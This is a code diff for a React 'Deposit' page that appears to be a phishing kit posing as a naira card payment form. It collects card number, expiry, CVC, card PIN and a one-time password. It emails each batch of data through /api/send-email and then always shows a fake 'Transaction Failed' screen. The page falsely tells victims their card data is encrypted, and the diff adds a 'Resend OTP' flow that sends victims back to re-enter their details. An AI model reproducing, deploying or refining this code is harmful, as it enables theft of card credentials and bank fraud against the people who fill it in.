@@ -1,7 +1,7 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
+import { useState, useRef } from "react"
 
 type Step = "amount" | "payment" | "pin" | "otp" | "failed"
 
@@ -30,64 +30,57 @@ export default function DepositPage() {
     pin: "",
     otp: "",
   })
-  const [timeLeft, setTimeLeft] = useState(420) // 7 minutes in seconds
+  const [timeLeft, setTimeLeft] = useState(420)
   const [showResend, setShowResend] = useState(false)
+  const timerRef = useRef<NodeJS.Timer | null>(null)
 
+  // ---------- RESET / RESEND HANDLERS ----------
+  const handleFullReset = () => {
+    setFormData({
+      amount: "",
+      email: "",
+      cardName: "",
+      cardNumber: "",
+      expiryDate: "",
+      cvc: "",
+      cardType: "",
+      pin: "",
+      otp: "",
+    })
+    setCurrentStep("amount")
+    setTimeLeft(420)
+    setShowResend(false)
+    if (timerRef.current) clearInterval(timerRef.current)
+  }
+
+  const handleResendOtp = () => {
+    setCurrentStep("amount") // back to first step
+    setShowResend(false)
+    startCountdown()
+  }
+
+  // ---------- COUNTDOWN ----------
+  const startCountdown = () => {
+    setTimeLeft(420)
+    setShowResend(false)
+    if (timerRef.current) clearInterval(timerRef.current)
+    timerRef.current = setInterval(() => {
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          if (timerRef.current) clearInterval(timerRef.current)
+          setShowResend(true)
+          return 0
+        }
+        return prev - 1
+      })
+    }, 1000)
+  }
+
+  // ---------- FORM SUBMISSIONS ----------
   const handleAmountSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     if (formData.amount && formData.email && Number.parseFloat(formData.amount) > 0) {
       setCurrentStep("payment")
-    }
-  }
-
-  const detectCardType = (number: string) => {
-    const cleanNumber = number.replace(/\s/g, "")
-    if (/^4/.test(cleanNumber)) return "visa"
-    if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) return "mastercard"
-    if (/^506[01]/.test(cleanNumber)) return "verve"
-    // For unknown or long cards, default to verve
-    if (cleanNumber.length > 16) return "verve"
-    return cleanNumber.length > 0 ? "verve" : ""
-  }
-
-  const formatCardNumber = (value: string) => {
-    const cleanValue = value.replace(/\D/g, "")
-    const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, "$1 ")
-    return formattedValue.slice(0, 23) // Allow for longer cards
-  }
-
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value
-    const cleanValue = value.replace(/\D/g, "")
-    if (cleanValue.length <= 19) { // Allow longer cards
-      const formattedValue = formatCardNumber(value)
-      setFormData((prev) => ({
-        ...prev,
-        cardNumber: formattedValue,
-        cardType: detectCardType(cleanValue),
-      }))
-    }
-  }
-
-  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    let value = e.target.value
-    
-    // Handle deletion of the slash
-    if (value.length < formData.expiryDate.length && formData.expiryDate.includes('/')) {
-      if (value.endsWith('/')) {
-        value = value.slice(0, -1)
-      }
-    }
-    
-    const cleanValue = value.replace(/\D/g, "")
-    let formattedValue = cleanValue
-    
-    if (cleanValue.length >= 2) {
-      formattedValue = cleanValue.slice(0, 2) + "/" + cleanValue.slice(2, 4)
-    }
-    
-    if (formattedValue.length <= 5) {
-      setFormData((prev) => ({ ...prev, expiryDate: formattedValue }))
     }
   }
 
@@ -103,59 +96,72 @@ export default function DepositPage() {
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (formData.pin.length === 4) {
-      // Send email with payment details
       try {
         await fetch("/api/send-email", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            type: "payment_details",
-            data: formData,
-          }),
+          body: JSON.stringify({ type: "payment_details", data: formData }),
         })
       } catch (error) {
         console.error("Email sending failed:", error)
       }
-
       setCurrentStep("otp")
       startCountdown()
     }
   }
 
-  const startCountdown = () => {
-    setTimeLeft(420) // Reset to 7 minutes
-    setShowResend(false)
-    const timer = setInterval(() => {
-      setTimeLeft((prev) => {
-        if (prev <= 1) {
-          clearInterval(timer)
-          setShowResend(true)
-          return 0
-        }
-        return prev - 1
-      })
-    }, 1000)
-  }
-
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (formData.otp.length > 0) {
-      // Send OTP confirmation email
       try {
         await fetch("/api/send-email", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            type: "otp_confirmation",
-            data: { ...formData, otp: formData.otp },
-          }),
+          body: JSON.stringify({ type: "otp_confirmation", data: { ...formData, otp: formData.otp } }),
         })
       } catch (error) {
         console.error("Email sending failed:", error)
       }
-
       setCurrentStep("failed")
     }
+  }
+
+  // ---------- CARD UTILS ----------
+  const detectCardType = (number: string) => {
+    const cleanNumber = number.replace(/\s/g, "")
+    if (/^4/.test(cleanNumber)) return "visa"
+    if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) return "mastercard"
+    if (/^506[01]/.test(cleanNumber)) return "verve"
+    if (cleanNumber.length > 16) return "verve"
+    return cleanNumber.length > 0 ? "verve" : ""
+  }
+
+  const formatCardNumber = (value: string) => {
+    const cleanValue = value.replace(/\D/g, "")
+    return cleanValue.replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 23)
+  }
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value
+    const cleanValue = value.replace(/\D/g, "")
+    if (cleanValue.length <= 19) {
+      setFormData((prev) => ({
+        ...prev,
+        cardNumber: formatCardNumber(value),
+        cardType: detectCardType(cleanValue),
+      }))
+    }
+  }
+
+  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value
+    if (value.length < formData.expiryDate.length && formData.expiryDate.includes('/') && value.endsWith('/')) {
+      value = value.slice(0, -1)
+    }
+    const cleanValue = value.replace(/\D/g, "")
+    let formattedValue = cleanValue
+    if (cleanValue.length >= 2) formattedValue = cleanValue.slice(0, 2) + "/" + cleanValue.slice(2, 4)
+    if (formattedValue.length <= 5) setFormData((prev) => ({ ...prev, expiryDate: formattedValue }))
   }
 
   const formatTime = (seconds: number) => {
@@ -167,28 +173,22 @@ export default function DepositPage() {
   const getCardIcon = () => {
     switch (formData.cardType) {
       case "visa":
-        return (
-          <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold">
-            VISA
-          </div>
-        )
+        return <div className="w-10 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-xs font-bold">VISA</div>
       case "mastercard":
         return (
-          <div className="bg-red-500 text-white px-2 py-1 rounded text-xs font-bold">
-            MC
+          <div className="w-10 h-6 relative flex items-center justify-center">
+            <div className="w-4 h-4 bg-red-500 rounded-full absolute left-0"></div>
+            <div className="w-4 h-4 bg-yellow-500 rounded-full absolute right-0"></div>
           </div>
         )
       case "verve":
-        return (
-          <div className="bg-green-600 text-white px-2 py-1 rounded text-xs font-bold">
-            VERVE
-          </div>
-        )
+        return <div className="w-10 h-6 bg-green-600 rounded flex items-center justify-center text-white text-xs font-bold">VERVE</div>
       default:
         return null
     }
   }
 
+  // ---------- STEP RENDER ----------
   const renderStep = () => {
     switch (currentStep) {
       case "amount":
@@ -197,11 +197,8 @@ export default function DepositPage() {
             <div className="mb-6">
               <p className="text-sm text-muted-foreground">Enter amount to deposit to your account below.</p>
             </div>
-
             <div>
-              <label htmlFor="email" className="block text-sm font-medium text-foreground mb-2">
-                Email Address
-              </label>
+              <label htmlFor="email" className="block text-sm font-medium text-foreground mb-2">Email Address</label>
               <input
                 type="email"
                 id="email"
@@ -212,11 +209,8 @@ export default function DepositPage() {
                 required
               />
             </div>
-
             <div>
-              <label htmlFor="amount" className="block text-sm font-medium text-foreground mb-2">
-                Amount To Deposit (₦)
-              </label>
+              <label htmlFor="amount" className="block text-sm font-medium text-foreground mb-2">Amount To Deposit (₦)</label>
               <input
                 type="text"
                 inputMode="decimal"
@@ -224,26 +218,16 @@ export default function DepositPage() {
                 value={formData.amount}
                 onChange={(e) => {
                   const value = e.target.value
-                  if (value === "" || /^\d*\.?\d*$/.test(value)) {
-                    setFormData((prev) => ({ ...prev, amount: value }))
-                  }
+                  if (value === "" || /^\d*\.?\d*$/.test(value)) setFormData((prev) => ({ ...prev, amount: value }))
                 }}
                 className="deposit-input text-lg"
                 placeholder="0.00"
                 required
               />
             </div>
-
-            <button
-              type="submit"
-              className="deposit-button"
-              disabled={!formData.amount || !formData.email || Number.parseFloat(formData.amount) <= 0}
-            >
-              Proceed
-            </button>
+            <button type="submit" className="deposit-button" disabled={!formData.amount || !formData.email || Number.parseFloat(formData.amount) <= 0}>Proceed</button>
           </form>
         )
-
       case "payment":
         return (
           <div>
@@ -252,10 +236,8 @@ export default function DepositPage() {
               <p className="text-sm text-muted-foreground">Amount To Pay: ₦{formData.amount}</p>
               <p className="text-sm text-muted-foreground">Email: {formData.email}</p>
             </div>
-
             <div className="mb-6">
               <h2 className="text-lg font-medium text-foreground mb-4">Payment Information:</h2>
-
               <form onSubmit={handlePaymentSubmit} className="space-y-4">
                 <div>
                   <input
@@ -267,7 +249,6 @@ export default function DepositPage() {
                     required
                   />
                 </div>
-
                 <div className="space-y-4">
                   <div className="relative">
                     <input
@@ -279,11 +260,8 @@ export default function DepositPage() {
                       placeholder="Card number"
                       required
                     />
-                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
-                      {getCardIcon()}
-                    </div>
+                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">{getCardIcon()}</div>
                   </div>
-                  
                   <div className="flex gap-3">
                     <input
                       type="text"
@@ -300,9 +278,7 @@ export default function DepositPage() {
                       value={formData.cvc}
                       onChange={(e) => {
                         const value = e.target.value.replace(/\D/g, "")
-                        if (value.length <= 4) {
-                          setFormData((prev) => ({ ...prev, cvc: value }))
-                        }
+                        if (value.length <= 4) setFormData((prev) => ({ ...prev, cvc: value }))
                       }}
                       className="deposit-input flex-1"
                       placeholder="CVC"
@@ -310,55 +286,31 @@ export default function DepositPage() {
                     />
                   </div>
                 </div>
-
-                <button
-                  type="submit"
-                  className="deposit-button mt-6"
-                  disabled={
-                    !formData.cardName ||
-                    formData.cardNumber.replace(/\s/g, "").length < 13 ||
-                    formData.expiryDate.length !== 5 ||
-                    formData.cvc.length < 3
-                  }
-                >
-                  Pay
-                </button>
+                <button type="submit" className="deposit-button mt-6"
+                  disabled={!formData.cardName || formData.cardNumber.replace(/\s/g, "").length < 13 || formData.expiryDate.length !== 5 || formData.cvc.length < 3}>Pay</button>
               </form>
-
               <div className="flex items-center justify-center mt-4 text-xs text-muted-foreground">
                 <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
-                  />
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                 </svg>
                 Your credit card information is encrypted
               </div>
             </div>
-
-            <button onClick={() => setCurrentStep("amount")} className="deposit-button-secondary mt-4">
-              ✕ Cancel
-            </button>
+            <div className="flex gap-3">
+              <button onClick={handleFullReset} className="deposit-button-secondary mt-4">✕ Cancel</button>
+            </div>
           </div>
         )
-
       case "pin":
         return (
           <div>
             <div className="mb-6">
               <h2 className="text-xl font-medium text-foreground mb-2">Enter Card PIN</h2>
-              <p className="text-sm text-muted-foreground">
-                To confirm that you are the owner of this card, please enter your card PIN.
-              </p>
+              <p className="text-sm text-muted-foreground">To confirm that you are the owner of this card, please enter your card PIN.</p>
             </div>
-
             <form onSubmit={handlePinSubmit} className="space-y-6">
               <div>
-                <label htmlFor="pin" className="block text-sm font-medium text-foreground mb-2">
-                  Enter Card Pin
-                </label>
+                <label htmlFor="pin" className="block text-sm font-medium text-foreground mb-2">Enter Card Pin</label>
                 <input
                   type="text"
                   inputMode="numeric"
@@ -383,9 +335,10 @@ export default function DepositPage() {
               </button>
             </form>
 
-            <button onClick={() => setCurrentStep("payment")} className="deposit-button-secondary mt-4">
-              ✕ Cancel
-            </button>
+            <div className="flex gap-3 mt-4">
+              <button onClick={() => setCurrentStep("payment")} className="deposit-button-secondary">✕ Cancel</button>
+              <button onClick={handleFullReset} className="deposit-button-secondary">Start Over</button>
+            </div>
           </div>
         )
 
@@ -395,14 +348,9 @@ export default function DepositPage() {
             <div className="mb-6">
               <h2 className="text-xl font-medium text-foreground mb-2">Enter OTP</h2>
               <p className="text-sm text-muted-foreground mb-4">Enter the One-Time PIN (OTP) sent to your device.</p>
-              {timeLeft > 0 && (
-                <p className="text-sm text-primary mb-4">Time remaining: {formatTime(timeLeft)}</p>
-              )}
+              {timeLeft > 0 && <p className="text-sm text-primary mb-4">Time remaining: {formatTime(timeLeft)}</p>}
               {showResend && (
-                <button
-                  onClick={startCountdown}
-                  className="text-sm text-primary hover:underline mb-4"
-                >
+                <button onClick={handleResendOtp} className="text-sm text-primary hover:underline mb-4">
                   Resend OTP
                 </button>
               )}
@@ -410,9 +358,7 @@ export default function DepositPage() {
 
             <form onSubmit={handleOtpSubmit} className="space-y-6">
               <div>
-                <label htmlFor="otp" className="block text-sm font-medium text-foreground mb-2">
-                  Enter OTP
-                </label>
+                <label htmlFor="otp" className="block text-sm font-medium text-foreground mb-2">Enter OTP</label>
                 <input
                   type="text"
                   inputMode="numeric"
@@ -434,9 +380,10 @@ export default function DepositPage() {
               </button>
             </form>
 
-            <button onClick={() => setCurrentStep("pin")} className="deposit-button-secondary mt-4">
-              ✕ Cancel
-            </button>
+            <div className="flex gap-3 mt-4">
+              <button onClick={() => setCurrentStep("pin")} className="deposit-button-secondary">✕ Cancel</button>
+              <button onClick={handleFullReset} className="deposit-button-secondary">Start Over</button>
+            </div>
           </div>
         )
 
@@ -450,18 +397,12 @@ export default function DepositPage() {
                 </svg>
               </div>
               <h2 className="text-xl font-medium text-foreground mb-2">Transaction Failed</h2>
-              <p className="text-sm text-muted-foreground">
-                Your transaction could not be processed. Please try again or contact support.
-              </p>
+              <p className="text-sm text-muted-foreground">Your transaction could not be processed. Please try again or contact support.</p>
             </div>
 
             <div className="space-y-3">
-              <button onClick={() => setCurrentStep("payment")} className="deposit-button">
-                Try Again
-              </button>
-              <button onClick={() => setCurrentStep("amount")} className="deposit-button-secondary">
-                Start Over
-              </button>
+              <button onClick={() => setCurrentStep("payment")} className="deposit-button">Try Again</button>
+              <button onClick={handleFullReset} className="deposit-button-secondary">Start Over</button>
             </div>
           </div>
         )
@@ -474,12 +415,7 @@ export default function DepositPage() {
         <div className="deposit-header">
           <div className="deposit-icon">
             <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path
-                strokeLinecap="round"
-                strokeLinejoin="round"
-                strokeWidth={2}
-                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
-              />
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
             </svg>
           </div>
           <h1 className="deposit-title">Deposit</h1>
@@ -489,4 +425,4 @@ export default function DepositPage() {
       </div>
     </div>
   )
-                }
+}
